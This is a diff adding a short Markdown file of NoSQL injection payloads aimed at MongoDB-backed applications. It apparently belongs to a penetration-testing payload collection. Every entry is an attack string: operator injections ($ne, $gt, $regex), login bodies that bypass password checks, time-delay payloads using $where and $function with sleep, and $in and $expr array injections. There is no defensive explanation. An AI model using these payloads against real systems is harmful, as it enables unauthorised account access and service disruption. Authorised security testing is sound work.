@@ -1,0 +1,19 @@
+# NoSQL Injection Payloads
+
+## MongoDB
+{"$ne": null}
+{"$gt": ""}
+{"$regex": ".*"}
+admin' || '1'=='1
+
+## Basic Auth Bypass
+{"username": "admin", "password": {"$ne": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+
+## Time-based
+{"$where": "sleep(5000)"}
+{"$function": "function() { sleep(5000); return true; }"}
+
+## Array Injection
+{"username": {"$in": ["admin", "root"]}}
+{"$expr": {"$gt": ["$password", ""]}}
